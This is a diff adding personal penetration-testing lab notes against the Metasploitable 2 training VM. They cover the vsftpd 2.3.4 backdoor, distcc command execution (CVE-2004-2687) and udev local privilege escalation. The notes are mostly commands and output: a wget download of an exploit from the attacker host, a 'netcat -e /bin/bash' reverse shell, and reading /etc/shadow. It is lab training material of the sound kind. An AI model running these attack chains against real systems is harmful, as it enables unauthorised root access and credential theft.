@@ -1,0 +1,259 @@
+
+
+------------------------------------------------Metasploitable 2.O----------------------------------------------------------
+Netdiscover 0.9 [Active/passive ARP reconnaissance tool]
+Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without dhcp server, 
+when you are wardriving. It can be also used on hub/switched networks.
+Built on top of libnet and libpcap, it can passively detect online hosts, or search for them, by actively sending ARP requests.
+Netdiscover can also be used to inspect your network ARP traffic, or find network addresses using auto scan mode, 
+which will scan for common local networks.
+Netdiscover uses the OUI table to show the vendor of the each MAC address discovered and is very useful for security checks or in pentests.
+
+netdiscover -r 192.168.80.0/24   ------> r-range
+
+---------------------------------------------------VSFTPD exploitation------------------------------------------------
+
+#msfconsole
+msf6 > search vsftp
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options 
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.20.130
+rhost => 192.168.20.130
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit #by this command we do exploitation
+
+[*] 192.168.20.130:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.20.130:21 - USER: 331 Please specify the password.
+[+] 192.168.20.130:21 - Backdoor service has been spawned, handling...
+[+] 192.168.20.130:21 - UID: uid=0(root) gid=0(root)
+id[*] Found shell.
+
+id
+pwd[*] Command shell session 1 opened (192.168.20.131:43303 -> 192.168.20.130:6200) at 2023-03-06 11:16:15 -0500
+
+uid=0(root) gid=0(root)
+uid=0(root) gid=0(root)
+cat /etc/shadow | grep msfadmin
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+
+Above we got hash. now we will try to find out which type o fhash is this using hash-identifier
+
+In another terminal,
+$hash-identifier
+ HASH: $1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
+                                                                                                                                                                                                                   
+Possible Hashs:                                                                                                                                                                                                    
+[+] MD5(Unix)                                                                                                                                                                                                      
+--------------------------------------------------
+
+
+Manual Exploit:-
+on one terminal, 
+tp 192.168.20.130   
+Connected to 192.168.20.130.
+220 (vsFTPd 2.3.4)
+Name (192.168.20.130:kali): a:)  #user name any alphabet with colon":" and close bracket
+331 Please specify the password.
+Password: 
+
+
+On second terminal run,
+nc -vvn 192.168.20.130 6200
+(UNKNOWN) [192.168.20.130] 6200 (?) open
+id
+uid=0(root) gid=0(root)
+uname -r
+2.6.24-16-server
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+id
+uid=0(root) gid=0(root)
+
+To metigate this vulnerabilty, just upgrade next version.
+
+
+---------------------------------------------------------------Metasploitable 2 - DISTCC + Privilege Escalation----------------------------------
+Running nmap   script
+nmap -p 3632 192.168.20.130 --script=distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'" --->through argument, we are running command
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-07 10:19 EST
+Nmap scan report for 192.168.20.130
+Host is up (0.0013s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux  #output of the command which we passed through args
+|   
+|     References:
+|       https://distcc.github.io/security.html
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+MAC Address: 00:0C:29:1D:BB:95 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
+zsh: segmentation fault  nmap -p 3632 192.168.20.130 --script=distcc-cve2004-2687 
+
+Privilege Escalation thorugh metasploit:--
+#msfconsole
+msf6 > search distcc
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_bash  # Here bydefault payload got selected. So here we will choose new payload.
+msf6 exploit(unix/misc/distcc_exec) > show payloads 
+ompatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   4   payload/cmd/unix/generic             #And many more payloads
+   
+   
+   msf6 exploit(unix/misc/distcc_exec) > set payload 0
+payload => cmd/unix/bind_perl
+msf6 exploit(unix/misc/distcc_exec) > show options
+msf6 exploit(unix/misc/distcc_exec) > set rhost
+set rhost   set rhosts  
+msf6 exploit(unix/misc/distcc_exec) > set rhosts 192.168.20.130
+rhosts => 192.168.20.130
+msf6 exploit(unix/misc/distcc_exec) > show options
+
+
+sf6 exploit(unix/misc/distcc_exec) > exploit 
+
+[*] Started bind TCP handler against 192.168.20.130:4444
+[*] Command shell session 1 opened (192.168.20.131:44825 -> 192.168.20.130:4444) at 2023-03-09 22:23:18 -0500
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)  #Here we got access of daemon user who has limited privilages 
+
+#Video Link:https://www.youtube.com/watch?v=DoUZFHwZntY&list=PLE1AnWAfWL7VFA_Zx8cVoB9fkCqU4YF9Z&index=5
+
+now we will check udev proceess of vulnerable m/c.
+ps aux | grep "udev"
+
+On metasploit m/c:- 
+searchsploit udev
+-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 - Local Privilege Escalation (1)                                                           | linux/local/8478.sh
+Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)                                                              | linux/local/8572.c
+Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                              | linux/local/41886.c
+Linux Kernel UDEV < 1.4.1 - 'Netlink' Local Privilege Escalation (Metasploit)                                                                           | linux/local/21848.rb
+--------------------------------------------------------------------------------------------------------
+
+now we have to copy 8572.c to target machine.
+so we wiil copy in /var/www/html/ and through wget we will donload it.
+
+#cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html 
+ 
+On vulnerable m/c
+wget 192.168.20.131/8572.c -O msp2.c
+ls
+5118.jsvc_up
+msp2.c
+touch run
+
+
+echo 'bin/bash' > run
+cat run 
+bin/bash
+echo '#!/bin/bash' > run
+cat run
+#!/bin/bash
+echo '/bin/netcat -e /bin/bash 192.168.20.131 5555' >> run
+
+cat run
+#!/bin/bash
+/bin/netcat -e /bin/bash 192.168.20.131 5555
+gcc msp2.c -o msp2  #c ompiled c code 
+
+now we need pid of netlink socket
+
+cat /proc/net/netlink
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+ddf40800 0   0      00000000 0        0        00000000 2
+df94d800 4   0      00000000 0        0        00000000 2
+dd892e00 7   0      00000000 0        0        00000000 2
+dd839a00 9   0      00000000 0        0        00000000 2
+dd80da00 10  0      00000000 0        0        00000000 2
+df5a6200 15  2748   00000001 0        0        00000000 2
+ddf40c00 15  0      00000000 0        0        00000000 2
+dd871200 16  0      00000000 0        0        00000000 2
+df838200 18  0      00000000 0        0        00000000 2
+./msp2 2748 # before running this command , open a terminal and run following command:-
+
+
+nc -nvlnp 5555
+
+#The Netcat ( nc ) command is a command-line utility for reading and writing data between two computer networks. 
+#The communication happens using either TCP or UDP. The command differs depending on the system ( netcat , nc , ncat , and others).
+
+listening on [any] 5555 ...
+connect to [192.168.20.131] from (UNKNOWN) [192.168.20.130] 43807
+id
+uid=0(root) gid=0(root)
+
+id
+uid=0(root) gid=0(root) # we got root access.
+
+
+----------------------------------------------------------------------------------------------------------------
+Basic Commands:
+msf6 > show -h                                                                                                                                                                               
+[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites                                                 
+[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions   
+
+
+#show nops
+The list of NOP generators will be returned by the show nops command. NOP stands for No Operation. 
+If we want to bypass the simple IDS/IPS signature of common NOP sleds, NOP will be used to change the NOP sled's pattern. 
+Using the CPU architecture, the generators of NOP will start.
+
+
+In metasploit any module that is not an exploit is an auxiliary module. Exploit modules always have a payload. 
+Auxiliary modules are a fascinating feature of the framework allowing it to extend for a variety of purposes other than exploitation.
